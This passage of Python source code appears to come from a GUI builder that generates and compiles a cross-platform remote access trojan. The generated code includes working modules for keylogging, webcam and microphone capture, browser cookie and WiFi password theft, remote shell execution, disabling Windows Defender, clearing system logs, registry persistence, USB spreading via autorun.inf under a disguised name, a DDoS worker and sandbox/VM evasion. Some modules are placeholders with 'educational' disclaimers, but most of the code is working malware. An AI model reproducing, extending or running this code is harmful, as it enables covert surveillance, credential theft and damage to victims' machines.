    if {str(self.evasion_sandbox.isChecked()).lower()}:
        if CrossPlatformRAT.is_sandbox_detected():
            sys.exit(0)
    
    rat = CrossPlatformRAT()
'''
        return code

    def get_platform_specific_imports(self):
        imports = []
        
        if self.target_os.currentText() in ["Windows", "All"]:
            imports.extend([
                "try:",
                "    import winreg",
                "    import win32api",
                "    import win32con",
                "    import win32event",
                "    import win32process",
                "    import win32security",
                "    import win32com.client",
                "    import winshell",
                "    import pythoncom",
                "    from ctypes import wintypes",
                "except ImportError:",
                "    pass"
            ])
        
        imports.extend([
            "import requests",
            "from PIL import ImageGrab, Image",
            "import pynput.keyboard",
            "import pynput.mouse",
            "import psutil",
            "import GPUtil",
            "import screeninfo",
        ])
        
        if self.feature_webcam.isChecked():
            imports.extend([
                "try:",
                "    import cv2",
                "    import numpy as np",
                "except ImportError:",
                "    pass"
            ])
            
        if self.feature_microphone.isChecked():
            imports.extend([
                "try:",
                "    import pyaudio",
                "    import wave",
                "except ImportError:",
                "    pass"
            ])
            
        if self.feature_browser_pass.isChecked():
            imports.extend([
                "try:",
                "    import browser_cookie3",
                "    import keyring",
                "except ImportError:",
                "    pass"
            ])
        
        return "\n".join(imports)

    def get_feature_imports(self):
        imports = []
        
        if self.feature_keylogger.isChecked():
            imports.append("from pynput import keyboard")
            
        if self.feature_screenshot.isChecked():
            imports.append("from PIL import ImageGrab")
            
        if self.feature_webcam.isChecked():
            imports.extend([
                "try:",
                "    import cv2",
                "except ImportError:",
                "    pass"
            ])
            
        if self.feature_network_sniffer.isChecked():
            imports.extend([
                "try:",
                "    from scapy.all import *",
                "except ImportError:",
                "    pass"
            ])
            
        return "\n".join(imports)

    def generate_custom_command_handlers(self):
        """Generate code for custom command handlers"""
        custom_commands = self.custom_commands.toPlainText().strip()
        if not custom_commands:
            return ""
            
        handlers = []
        for line in custom_commands.split('\\n'):
            if line.strip() and line.startswith('/'):
                parts = line.split('-')
                if len(parts) >= 2:
                    cmd_name = parts[0].strip().replace('/', '')
                    description = parts[1].strip()
                    handlers.append(f"            '{cmd_name}': self.custom_{cmd_name},")
        
        return "\\n".join(handlers)

    def generate_all_command_methods(self):
        """Generate all command handler methods"""
        methods = []
        
        # Basic system commands
        methods.append('''
    def show_help(self, args):
        """Show available commands"""
        commands = list(self.command_handlers.keys())
        return f"Available commands: {', '.join(commands)}"''')

        methods.append('''
    def get_system_info(self, args):
        """Get detailed system information"""
        try:
            info = {
                'platform': platform.platform(),
                'processor': platform.processor(),
                'architecture': platform.architecture()[0],
                'hostname': socket.gethostname(),
                'username': getpass.getuser(),
                'ram': f"{psutil.virtual_memory().total / (1024**3):.2f} GB",
                'disk_usage': {k: f"{v.percent}%" for k, v in psutil.disk_partitions()},
                'gpu': [gpu.name for gpu in GPUtil.getGPUs()] if GPUtil.getGPUs() else [],
                'boot_time': datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
            }
            return json.dumps(info, indent=2)
        except Exception as e:
            return f"System info error: {e}"''')

        methods.append('''
    def get_process_list(self, args):
        """Get running processes"""
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'memory_percent', 'cpu_percent']):
                try:
                    processes.append(proc.info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            return json.dumps(processes[:50], indent=2)  # Limit to first 50
        except Exception as e:
            return f"Process list error: {e}"''')

        methods.append('''
    def list_files(self, args):
        """List directory contents"""
        try:
            path = args[0] if args else "."
            files = []
            for item in Path(path).iterdir():
                files.append({
                    'name': item.name,
                    'is_dir': item.is_dir(),
                    'size': item.stat().st_size if item.is_file() else 0,
                    'modified': datetime.fromtimestamp(item.stat().st_mtime).isoformat()
                })
            return json.dumps(files, indent=2)
        except Exception as e:
            return f"File list error: {e}"''')

        methods.append('''
    def download_file(self, args):
        """Download file from target"""
        try:
            if not args:
                return "Usage: download <file_path>"
            
            file_path = Path(args[0])
            if not file_path.exists():
                return f"File not found: {file_path}"
            
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            # For demonstration, return base64 encoded data
            # In real implementation, this would upload to server
            return f"File {file_path} ready for download ({len(file_data)} bytes)"
            
        except Exception as e:
            return f"Download error: {e}"''')

        methods.append('''
    def upload_file(self, args):
        """Upload file to target"""
        try:
            if len(args) < 2:
                return "Usage: upload <local_path> <remote_path>"
            
            # This would receive file data from the server
            # For now, just create a dummy file
            remote_path = Path(args[1])
            with open(remote_path, 'w') as f:
                f.write("Uploaded file content")
            
            return f"File uploaded to: {remote_path}"
            
        except Exception as e:
            return f"Upload error: {e}"''')

        methods.append('''
    def take_screenshot(self, args):
        """Capture screenshot"""
        try:
            screenshot = ImageGrab.grab()
            screenshot_path = Path("screenshot.png")
            screenshot.save(screenshot_path)
            
            # Get screenshot info
            info = {
                'path': str(screenshot_path.absolute()),
                'size': screenshot.size,
                'mode': screenshot.mode
            }
            
            return f"Screenshot captured: {json.dumps(info)}"
            
        except Exception as e:
            return f"Screenshot error: {e}"''')

        # Keylogger methods
        if self.feature_keylogger.isChecked():
            methods.append('''
    def start_keylogger(self, args):
        """Start keylogging"""
        try:
            if not self.keylogger_active:
                self.keylogger_active = True
                self.keylogger_thread = threading.Thread(target=self.keylogger_worker)
                self.keylogger_thread.daemon = True
                self.keylogger_thread.start()
                return "Keylogger started"
            else:
                return "Keylogger already running"
        except Exception as e:
            return f"Keylogger start failed: {e}"''')

            methods.append('''
    def stop_keylogger(self, args):
        """Stop keylogging"""
        try:
            self.keylogger_active = False
            return "Keylogger stopped"
        except Exception as e:
            return f"Keylogger stop failed: {e}"''')

            methods.append('''
    def dump_keylogger(self, args):
        """Dump keylogger data"""
        try:
            if Path(self.keylogger_file).exists():
                with open(self.keylogger_file, 'r') as f:
                    content = f.read()
                return f"Keylog data: {content[:1000]}"  # Limit output
            else:
                return "No keylog data available"
        except Exception as e:
            return f"Keylog dump failed: {e}"''')

            methods.append('''
    def keylogger_worker(self):
        """Keylogger background worker"""
        def on_press(key):
            if self.keylogger_active:
                try:
                    with open(self.keylogger_file, "a", encoding='utf-8') as f:
                        f.write(f"{key} ")
                except:
                    pass
                    
        with pynput.keyboard.Listener(on_press=on_press) as listener:
            listener.join()''')

            methods.append('''
    def auto_exfiltrate_keylogs(self):
        """Auto-exfiltrate keylogger data"""
        try:
            if Path(self.keylogger_file).exists():
                file_size = Path(self.keylogger_file).stat().st_size
                if file_size > 1024:  # Exfiltrate if >1KB
                    self.send_message(f"Keylog data size: {file_size} bytes")
                    # Reset file after exfiltration
                    Path(self.keylogger_file).write_text("")
        except:
            pass''')

        # Webcam methods
        if self.feature_webcam.isChecked():
            methods.append('''
    def capture_webcam(self, args):
        """Capture webcam image"""
        try:
            import cv2
            camera = cv2.VideoCapture(0)
            ret, frame = camera.read()
            
            if ret:
                cv2.imwrite('webcam_capture.jpg', frame)
                return "Webcam capture successful"
            else:
                return "Webcam capture failed"
                
        except Exception as e:
            return f"Webcam error: {e}"''')

        # Microphone methods
        if self.feature_microphone.isChecked():
            methods.append('''
    def record_microphone(self, args):
        """Record microphone audio"""
        try:
            import pyaudio
            import wave
            
            duration = int(args[0]) if args else 5
            chunk = 1024
            format = pyaudio.paInt16
            channels = 2
            rate = 44100
            
            p = pyaudio.PyAudio()
            stream = p.open(format=format, channels=channels, rate=rate,
                          input=True, frames_per_buffer=chunk)
            
            frames = []
            for i in range(0, int(rate / chunk * duration)):
                data = stream.read(chunk)
                frames.append(data)
            
            stream.stop_stream()
            stream.close()
            p.terminate()
            
            wf = wave.open('recording.wav', 'wb')
            wf.setnchannels(channels)
            wf.setsampwidth(p.get_sample_size(format))
            wf.setframerate(rate)
            wf.writeframes(b''.join(frames))
            wf.close()
            
            return f"Audio recorded for {duration} seconds"
            
        except Exception as e:
            return f"Microphone recording failed: {e}"''')

        # Clipboard methods
        methods.append('''
    def get_clipboard(self, args):
        """Get clipboard content"""
        try:
            import pyperclip
            content = pyperclip.paste()
            return f"Clipboard: {content}" if content else "Clipboard is empty"
        except Exception as e:
            return f"Clipboard read failed: {e}"''')

        methods.append('''
    def set_clipboard(self, args):
        """Set clipboard content"""
        try:
            import pyperclip
            content = ' '.join(args)
            pyperclip.copy(content)
            return f"Clipboard set to: {content}"
        except Exception as e:
            return f"Clipboard write failed: {e}"''')

        # Browser password extraction
        if self.feature_browser_pass.isChecked():
            methods.append('''
    def extract_browser_passwords(self, args):
        """Extract browser passwords"""
        try:
            passwords = []
            
            # Chrome
            try:
                import browser_cookie3
                cookies = browser_cookie3.chrome()
                for cookie in cookies:
                    if 'password' in cookie.name.lower():
                        passwords.append(f"Chrome: {cookie.name} = {cookie.value}")
            except:
                pass
                
            # Firefox
            try:
                cookies = browser_cookie3.firefox()
                for cookie in cookies:
                    if 'password' in cookie.name.lower():
                        passwords.append(f"Firefox: {cookie.name} = {cookie.value}")
            except:
                pass
                
            return "\\n".join(passwords) if passwords else "No passwords found"
            
        except Exception as e:
            return f"Password extraction failed: {e}"''')

        # Network information
        methods.append('''
    def get_network_info(self, args):
        """Get network information"""
        try:
            info = {
                'hostname': socket.gethostname(),
                'ip_address': socket.gethostbyname(socket.gethostname()),
                'connections': []
            }
            
            # Network connections
            for conn in psutil.net_connections(kind='inet'):
                if conn.laddr:
                    info['connections'].append({
                        'local_address': f"{conn.laddr.ip}:{conn.laddr.port}",
                        'status': conn.status
                    })
            
            return json.dumps(info, indent=2)
            
        except Exception as e:
            return f"Network info error: {e}"''')

        # Installed software
        methods.append('''
    def get_installed_software(self, args):
        """Get installed software list"""
        try:
            software = []
            
            if platform.system() == "Windows":
                try:
                    import winreg
                    key = winreg.HKEY_LOCAL_MACHINE
                    subkey = r"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall"
                    
                    with winreg.OpenKey(key, subkey) as reg_key:
                        for i in range(winreg.QueryInfoKey(reg_key)[0]):
                            try:
                                software_name = winreg.EnumKey(reg_key, i)
                                with winreg.OpenKey(reg_key, software_name) as software_key:
                                    try:
                                        name = winreg.QueryValueEx(software_key, "DisplayName")[0]
                                        software.append(name)
                                    except:
                                        pass
                            except:
                                pass
                except:
                    pass
            else:
                # Linux/Mac software detection
                pass
                
            return "\\n".join(software[:20])  # Limit output
            
        except Exception as e:
            return f"Software list error: {e}"''')

        # Shell execution
        methods.append('''
    def execute_shell(self, args):
        """Execute shell command"""
        try:
            if not args:
                return "Usage: shell_exec <command>"
            
            command = ' '.join(args)
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            
            output = result.stdout if result.stdout else result.stderr
            return output if output else "Command executed (no output)"
            
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return f"Shell execution error: {e}"''')

        # Input blocking
        methods.append('''
    def block_input(self, args):
        """Block user input"""
        try:
            seconds = int(args[0]) if args else 10
            
            if platform.system() == "Windows":
                import ctypes
                ctypes.windll.user32.BlockInput(True)
                threading.Timer(seconds, ctypes.windll.user32.BlockInput, [False]).start()
                return f"Input blocked for {seconds} seconds"
            else:
                return "Input blocking requires Windows"
                
        except Exception as e:
            return f"Input block failed: {e}"''')

        methods.append('''
    def unblock_input(self, args):
        """Unblock user input"""
        try:
            if platform.system() == "Windows":
                import ctypes
                ctypes.windll.user32.BlockInput(False)
                return "Input unblocked"
            else:
                return "Input unblocking requires Windows"
                
        except Exception as e:
            return f"Input unblock failed: {e}"''')

        # Persistence methods
        methods.append('''
    def add_persistence(self, args):
        """Add persistence mechanism"""
        try:
            if platform.system() == "Windows":
                self.setup_autostart_windows()
                return "Persistence added (Windows autostart)"
            elif platform.system() == "Linux":
                self.setup_autostart_linux()
                return "Persistence added (Linux autostart)"
            elif platform.system() == "Darwin":
                self.setup_autostart_macos()
                return "Persistence added (macOS autostart)"
            else:
                return "Persistence not supported on this platform"
                
        except Exception as e:
            return f"Persistence add failed: {e}"''')

        methods.append('''
    def remove_persistence(self, args):
        """Remove persistence mechanism"""
        try:
            if platform.system() == "Windows":
                import winreg
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
                
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                    winreg.DeleteValue(reg_key, "SystemUpdate")
                return "Persistence removed"
            else:
                return "Persistence removal not implemented for this platform"
                
        except Exception as e:
            return f"Persistence remove failed: {e}"''')

        # Reverse proxy
        if self.feature_reverse_proxy.isChecked():
            methods.append('''
    def start_reverse_proxy(self, args):
        """Start reverse proxy"""
        try:
            if len(args) < 2:
                return "Usage: reverse_proxy <local_port> <remote_host> <remote_port>"
            
            local_port = int(args[0])
            remote_host = args[1]
            remote_port = int(args[2])
            
            # Simple reverse proxy implementation
            def handle_client(client_socket):
                server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server_socket.connect((remote_host, remote_port))
                
                while True:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    server_socket.send(data)
                    
                    response = server_socket.recv(4096)
                    if not response:
                        break
                    client_socket.send(response)
                
                client_socket.close()
                server_socket.close()
            
            proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            proxy_socket.bind(('0.0.0.0', local_port))
            proxy_socket.listen(5)
            
            threading.Thread(target=self.proxy_worker, args=(proxy_socket, handle_client), daemon=True).start()
            return f"Reverse proxy started on port {local_port}"
            
        except Exception as e:
            return f"Reverse proxy failed: {e}"''')

            methods.append('''
    def proxy_worker(self, proxy_socket, handler):
        """Reverse proxy worker"""
        while True:
            try:
                client_socket, addr = proxy_socket.accept()
                threading.Thread(target=handler, args=(client_socket,), daemon=True).start()
            except:
                break''')

        # Port scanner
        if self.feature_port_scanner.isChecked():
            methods.append('''
    def port_scan(self, args):
        """Port scan target"""
        try:
            if len(args) < 1:
                return "Usage: port_scan <target_ip> [start_port] [end_port]"
            
            target = args[0]
            start_port = int(args[1]) if len(args) > 1 else 1
            end_port = int(args[2]) if len(args) > 2 else 1000
            
            open_ports = []
            
            def scan_port(port):
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(1)
                        result = s.connect_ex((target, port))
                        if result == 0:
                            open_ports.append(port)
                except:
                    pass
            
            threads = []
            for port in range(start_port, end_port + 1):
                thread = threading.Thread(target=scan_port, args=(port,))
                thread.daemon = True
                thread.start()
                threads.append(thread)
            
            for thread in threads:
                thread.join(timeout=0.1)
            
            return f"Open ports on {target}: {open_ports}" if open_ports else f"No open ports found on {target}"
            
        except Exception as e:
            return f"Port scan failed: {e}"''')

        # Network sniffer
        if self.feature_network_sniffer.isChecked():
            methods.append('''
    def network_sniff(self, args):
        """Start network sniffing"""
        try:
            from scapy.all import sniff
            
            packet_count = int(args[0]) if args else 10
            
            def packet_callback(packet):
                if packet.haslayer('IP'):
                    src_ip = packet['IP'].src
                    dst_ip = packet['IP'].dst
                    self.send_message(f"Packet: {src_ip} -> {dst_ip}")
            
            sniff(prn=packet_callback, count=packet_count, timeout=10)
            return f"Captured {packet_count} packets"
            
        except Exception as e:
            return f"Network sniffing failed: {e}"''')

        # Cryptocurrency miner
        if self.feature_miner.isChecked():
            methods.append('''
    def start_miner(self, args):
        """Start cryptocurrency miner"""
        try:
            # This is a placeholder - actual mining would require specific algorithms
            return "Miner started (placeholder)"
        except Exception as e:
            return f"Miner start failed: {e}"''')

        methods.append('''
    def stop_miner(self, args):
        """Stop cryptocurrency miner"""
        return "Miner stopped"''')

        # USB Spreader
        if self.feature_usb_spreader.isChecked():
            methods.append('''
    def spread_usb(self, args):
        """Spread via USB devices"""
        try:
            if platform.system() == "Windows":
                import win32file
                
                drives = win32file.GetLogicalDrives()
                for drive_num in range(26):
                    if drives & (1 << drive_num):
                        drive_letter = chr(65 + drive_num)
                        drive_path = f"{drive_letter}:\\\\"
                        if win32file.GetDriveType(drive_path) == win32file.DRIVE_REMOVABLE:
                            # Copy to USB
                            self.copy_to_usb(drive_path)
                            return f"Spread to USB drive {drive_letter}"
                
                return "No USB drives found"
            else:
                return "USB spreading requires Windows"
                
        except Exception as e:
            return f"USB spread failed: {e}"''')

            methods.append('''
    def copy_to_usb(self, drive_path):
        """Copy RAT to USB drive"""
        try:
            current_file = Path(sys.argv[0])
            target_path = Path(drive_path) / "SystemUpdate.exe"
            shutil.copy2(current_file, target_path)
            
            # Create autorun.inf
            autorun_content = f"""[AutoRun]
open=SystemUpdate.exe
action=System Update
"""
            autorun_path = Path(drive_path) / "autorun.inf"
            autorun_path.write_text(autorun_content)
            
        except:
            pass''')

            methods.append('''
    def check_usb_devices(self):
        """Check for new USB devices"""
        # This would monitor for new USB devices
        pass''')

        # Password spray attack
        if self.feature_password_spray.isChecked():
            methods.append('''
    def password_spray_attack(self, args):
        """Perform password spray attack"""
        try:
            # This is a placeholder for demonstration
            # Actual implementation would require careful consideration of legality
            return "Password spray attack (placeholder - for educational purposes only)"
        except Exception as e:
            return f"Password spray failed: {e}"''')

        # ARP Spoofing
        if self.feature_arp_spoof.isChecked():
            methods.append('''
    def arp_spoof(self, args):
        """Perform ARP spoofing"""
        try:
            # This is a placeholder for demonstration
            # Actual implementation would require root/administrator privileges
            return "ARP spoofing (placeholder - for educational purposes only)"
        except Exception as e:
            return f"ARP spoofing failed: {e}"''')

        # DDoS attack
        if self.feature_ddos.isChecked():
            methods.append('''
    def start_ddos(self, args):
        """Start DDoS attack"""
        try:
            if len(args) < 2:
                return "Usage: ddos_start <target_url> <thread_count>"
            
            target = args[0]
            thread_count = int(args[1])
            
            self.ddos_active = True
            self.ddos_threads = []
            
            for i in range(thread_count):
                thread = threading.Thread(target=self.ddos_worker, args=(target,))
                thread.daemon = True
                thread.start()
                self.ddos_threads.append(thread)
            
            return f"DDoS attack started on {target} with {thread_count} threads"
            
        except Exception as e:
            return f"DDoS start failed: {e}"''')

            methods.append('''
    def stop_ddos(self, args):
        """Stop DDoS attack"""
        self.ddos_active = False
        return "DDoS attack stopped"''')

            methods.append('''
    def ddos_worker(self, target):
        """DDoS worker thread"""
        import requests
        while self.ddos_active:
            try:
                requests.get(target, timeout=1)
            except:
                pass''')

        # Privilege escalation
        methods.append('''
    def elevate_privileges(self, args):
        """Attempt privilege escalation"""
        try:
            if platform.system() == "Windows":
                # Various Windows privilege escalation techniques
                return "Privilege escalation attempted (Windows)"
            elif platform.system() == "Linux":
                # Various Linux privilege escalation techniques
                return "Privilege escalation attempted (Linux)"
            else:
                return "Privilege escalation not implemented for this platform"
                
        except Exception as e:
            return f"Privilege escalation failed: {e}"''')

        # Defender disable (Windows)
        methods.append('''
    def disable_defender(self, args):
        """Disable Windows Defender"""
        try:
            if platform.system() == "Windows":
                import subprocess
                commands = [
                    'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f',
                    'net stop "WinDefend"',
                    'sc config WinDefend start= disabled'
                ]
                
                for cmd in commands:
                    subprocess.run(cmd, shell=True, capture_output=True)
                
                return "Windows Defender disabled"
            else:
                return "This command is Windows only"
                
        except Exception as e:
            return f"Defender disable failed: {e}"''')

        # Log clearing
        methods.append('''
    def clear_logs(self, args):
        """Clear system logs"""
        try:
            if platform.system() == "Windows":
                import subprocess
                subprocess.run('wevtutil el | foreach {wevtutil cl "$_"}', shell=True, capture_output=True)
                return "Windows event logs cleared"
            elif platform.system() == "Linux":
                import subprocess
                subprocess.run('echo "" > /var/log/syslog', shell=True)
                subprocess.run('echo "" > /var/log/auth.log', shell=True)
                return "Linux system logs cleared"
            else:
                return "Log clearing not implemented for this platform"
                
        except Exception as e:
            return f"Log clearing failed: {e}"''')

        # WiFi password extraction
        methods.append('''
    def get_wifi_passwords(self, args):
        """Get saved WiFi passwords"""
        try:
            if platform.system() == "Windows":
                import subprocess
                result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
                profiles = [line.split(":")[1].strip() for line in result.stdout.split('\\n') if "All User Profile" in line]
                
                wifi_passwords = []
                for profile in profiles:
                    try:
                        result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], 
                                              capture_output=True, text=True)
                        lines = result.stdout.split('\\n')
                        password = next((line.split(":")[1].strip() for line in lines if "Key Content" in line), None)
                        if password:
                            wifi_passwords.append(f"{profile}: {password}")
                    except:
                        pass
                
                return "\\n".join(wifi_passwords) if wifi_passwords else "No WiFi passwords found"
            else:
                return "WiFi password extraction requires Windows"
                
        except Exception as e:
            return f"WiFi password extraction failed: {e}"''')

        # Bitcoin wallet extraction
        methods.append('''
    def get_bitcoin_wallets(self, args):
        """Get Bitcoin wallet information"""
        try:
            # Common Bitcoin wallet locations
            wallet_locations = []
            
            if platform.system() == "Windows":
                wallet_dirs = [
                    Path.home() / "AppData" / "Roaming" / "Bitcoin",
                    Path.home() / "AppData" / "Roaming" / "Electrum",
                ]
            elif platform.system() == "Linux":
                wallet_dirs = [
                    Path.home() / ".bitcoin",
                    Path.home() / ".electrum",
                ]
            elif platform.system() == "Darwin":
                wallet_dirs = [
                    Path.home() / "Library" / "Application Support" / "Bitcoin",
                    Path.home() / "Library" / "Application Support" / "Electrum",
                ]
            
            for wallet_dir in wallet_dirs:
                if wallet_dir.exists():
                    wallet_locations.append(str(wallet_dir))
            
            return "Bitcoin wallet locations found:\\n" + "\\n".join(wallet_locations) if wallet_locations else "No Bitcoin wallets found"
            
        except Exception as e:
            return f"Bitcoin wallet search failed: {e}"''')

        # Browser history extraction
        methods.append('''
    def get_browser_history(self, args):
        """Get browser history"""
        try:
            history = []
            
            # Chrome history
            try:
                import browser_cookie3
                cookies = browser_cookie3.chrome()
                for cookie in cookies:
                    history.append(f"Chrome: {cookie.domain} - {cookie.name}")
            except:
                pass
                
            return "\\n".join(history[:20]) if history else "No browser history found"
            
        except Exception as e:
            return f"Browser history extraction failed: {e}"''')

        # System control commands
        methods.append('''
    def shutdown_system(self, args):
        """Shutdown the system"""
        try:
            if platform.system() == "Windows":
                os.system("shutdown /s /t 0")
            elif platform.system() == "Linux":
                os.system("shutdown now")
            elif platform.system() == "Darwin":
                os.system("shutdown -h now")
            return "System shutdown initiated"
        except Exception as e:
            return f"Shutdown failed: {e}"''')

        methods.append('''
    def restart_system(self, args):
        """Restart the system"""
        try:
            if platform.system() == "Windows":
                os.system("shutdown /r /t 0")
            elif platform.system() == "Linux":
                os.system("reboot")
            elif platform.system() == "Darwin":
                os.system("shutdown -r now")
            return "System restart initiated"
        except Exception as e:
            return f"Restart failed: {e}"''')

        methods.append('''
    def logoff_system(self, args):
        """Logoff current user"""
        try:
            if platform.system() == "Windows":
                os.system("shutdown /l")
            else:
                return "Logoff requires Windows"
            return "User logoff initiated"
        except Exception as e:
            return f"Logoff failed: {e}"''')

        # UI interaction commands
        methods.append('''
    def show_message_box(self, args):
        """Show message box"""
        try:
            message = ' '.join(args) if args else "System Message"
            
            if platform.system() == "Windows":
                import ctypes
                ctypes.windll.user32.MessageBoxW(0, message, "System Alert", 0x40 | 0x0)
            else:
                # Linux/Mac alternative
                subprocess.run(['zenity', '--info', '--text', message])
                
            return "Message box displayed"
        except Exception as e:
            return f"Message box failed: {e}"''')

        methods.append('''
    def play_beep(self, args):
        """Play system beep"""
        try:
            import winsound
            winsound.Beep(1000, 1000)  # Frequency, Duration
            return "Beep played"
        except:
            return "Beep not supported on this platform"''')

        methods.append('''
    def change_wallpaper(self, args):
        """Change desktop wallpaper"""
        try:
            if platform.system() == "Windows":
                import ctypes
                # This would require an actual image file
                ctypes.windll.user32.SystemParametersInfoW(20, 0, "path_to_image.jpg", 0)
                return "Wallpaper changed"
            else:
                return "Wallpaper change requires Windows"
        except Exception as e:
            return f"Wallpaper change failed: {e}"''')

        # Web search
        methods.append('''
    def web_search(self, args):
        """Perform web search"""
        try:
            if not args:
                return "Usage: web_search <query>"
            
            query = ' '.join(args)
            import webbrowser
            webbrowser.open(f"https://www.google.com/search?q={query}")
            return f"Web search for: {query}"
        except Exception as e:
            return f"Web search failed: {e}"''')

        # Geolocation
        methods.append('''
    def get_geolocation(self, args):
        """Get geolocation information"""
        try:
            import requests
            response = requests.get('http://ipinfo.io/json')
            data = response.json()
            return json.dumps(data, indent=2)
        except Exception as e:
            return f"Geolocation failed: {e}"''')

        # Ransomware module
        if self.feature_ransomware.isChecked():
            methods.append('''
    def ransomware_encrypt(self, args):
        """Encrypt files (ransomware simulation)"""
        try:
            # WARNING: This is for educational purposes only
            # Actual ransomware implementation would be illegal
            return "Ransomware encryption (simulation only - no files were harmed)"
        except Exception as e:
            return f"Ransomware encryption failed: {e}"''')

            methods.append('''
    def ransomware_decrypt(self, args):
        """Decrypt files (ransomware simulation)"""
        return "Ransomware decryption (simulation only)"''')

        # Anti-analysis methods
        methods.append('''
    @staticmethod
    def is_vm_detected():
        """Check if running in virtual machine"""
        try:
            # Check for common VM artifacts
            vm_indicators = [
                # Process names
                "vmtoolsd", "vmware", "vbox", "qemu",
                # MAC address prefixes
                "00:05:69", "00:0C:29", "00:1C:14", "00:50:56",
                # Hardware
                "vmware", "virtual", "qemu", "vbox"
            ]
            
            # Check processes
            for proc in psutil.process_iter(['name']):
                if any(indicator in proc.info['name'].lower() for indicator in vm_indicators):
                    return True
            
            # Check MAC address
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == psutil.AF_LINK:
                        if any(addr.address.lower().startswith(prefix) for prefix in vm_indicators if ':' in prefix):
                            return True
            
            return False
        except:
            return False''')

        methods.append('''
    @staticmethod
    def is_sandbox_detected():
        """Check if running in sandbox"""
        try:
            # Check for sandbox indicators
            sandbox_indicators = [
                # Short uptime
                psutil.boot_time() > time.time() - 3600,  # Less than 1 hour
                # Low resources
                psutil.virtual_memory().total < 2 * 1024**3,  # Less than 2GB RAM
                # Common sandbox usernames
                getpass.getuser().lower() in ['sandbox', 'virus', 'malware', 'test'],
                # Common sandbox hostnames
                socket.gethostname().lower() in ['sandbox', 'virus', 'malware', 'test']
            ]
            
            return any(sandbox_indicators)
        except:
            return False''')

        # Generate custom command methods
        custom_commands = self.custom_commands.toPlainText().strip()
        if custom_commands:
            for line in custom_commands.split('\\n'):
                if line.strip() and line.startswith('/'):
                    parts = line.split('-')
                    if len(parts) >= 2:
                        cmd_name = parts[0].strip().replace('/', '')
                        description = parts[1].strip()
                        methods.append(f'''
    def custom_{cmd_name}(self, args):
        """{description}"""
        try:
            # Custom command implementation
            return "Custom command {cmd_name} executed successfully"
        except Exception as e:
            return f"Custom command {cmd_name} failed: {{e}}"''')

        return "\\n".join(methods)

    def build_executable(self):
        if not self.validate_configuration():
            return

        try:
            self.log_message("🚀 Starting cross-platform build process...")
            self.build_progress.setValue(0)
            
            output_dir = Path(self.output_dir.text())
            output_dir.mkdir(parents=True, exist_ok=True)
            
            self.build_progress.setValue(20)
            self.build_status.setText("Generating source code...")
            self.log_build("📝 Generating RAT source code...")
            
            rat_code = self.generate_cross_platform_rat()
            source_file = Path(self.temp_dir) / "rat_client.py"
            with open(source_file, 'w', encoding='utf-8') as f:
                f.write(rat_code)
            
            self.build_progress.setValue(40)
            self.build_status.setText("Setting up dependencies...")
            self.log_build("📦 Configuring dependencies...")
            
            requirements_file = Path(self.temp_dir) / "requirements.txt"
            requirements_content = self.generate_requirements_file()
            with open(requirements_file, 'w') as f:
                for req in requirements_content:
                    f.write(req + '\\n')
            
            self.build_progress.setValue(60)
            self.build_status.setText("Compiling executable...")
            self.log_build("🔨 Compiling executable...")
            
            target_os = self.target_os.currentText().lower()
            if target_os == "all":
                self.build_for_all_platforms(output_dir, source_file)
            else:
                self.build_for_platform(target_os, output_dir, source_file)
            
            self.build_progress.setValue(90)
            self.build_status.setText("Finalizing build...")
            self.log_build("🎉 Build completed successfully!")
            
            self.build_progress.setValue(100)
            self.build_status.setText("Build completed!")
            
            QMessageBox.information(self, "Build Complete", 
                                  "RAT executable(s) built successfully!\\n"
                                  f"Location: {output_dir}")
            
        except Exception as e:
            self.log_message(f"❌ Build failed: {str(e)}")
            self.build_status.setText("Build failed!")
            QMessageBox.critical(self, "Build Failed", f"Build process failed:\\n{str(e)}")

    def generate_requirements_file(self):
        requirements = [
            "requests>=2.28.0",
            "pillow>=9.0.0",
            "pynput>=1.7.0",
            "psutil>=5.9.0",
            "pyperclip>=1.8.0",
            "GPUtil>=1.4.0",
            "screeninfo>=0.8.1",
        ]
        
        if self.comm_method.currentText() == "Telegram":
            requirements.append("telepot>=1.4")
            
        if self.feature_webcam.isChecked():
            requirements.append("opencv-python>=4.5.0")
            
        if self.feature_microphone.isChecked():
            requirements.append("pyaudio>=0.2.11")
            
        if self.feature_browser_pass.isChecked():
            requirements.append("browser-cookie3>=0.16.1")
            requirements.append("keyring>=23.0.0")
            
        if self.feature_network_sniffer.isChecked():
            requirements.append("scapy>=2.4.5")
            
        if platform.system().lower() == "windows":
            requirements.extend([
                "pywin32>=300",
                "winshell>=0.6"
            ])
            
        return requirements

    def build_for_platform(self, platform_name, output_dir, source_file):
        try:
            output_name = self.output_name.text()
            
            if platform_name == "windows":
                self.build_windows_exe(output_dir, source_file, output_name)
            elif platform_name == "linux":
                self.build_linux_exe(output_dir, source_file, output_name)
            elif platform_name == "macos":
                self.build_macos_exe(output_dir, source_file, output_name)
                
        except Exception as e:
            raise Exception(f"Failed to build for {platform_name}: {str(e)}")

    def build_windows_exe(self, output_dir, source_file, output_name):
        pyinstaller_cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--noconsole" if self.noconsole.isChecked() else "--console",
            "--name", output_name.replace('.exe', ''),
            "--distpath", str(output_dir),
            "--workpath", str(Path(self.temp_dir) / "build"),
            "--specpath", str(Path(self.temp_dir)),
            str(source_file)
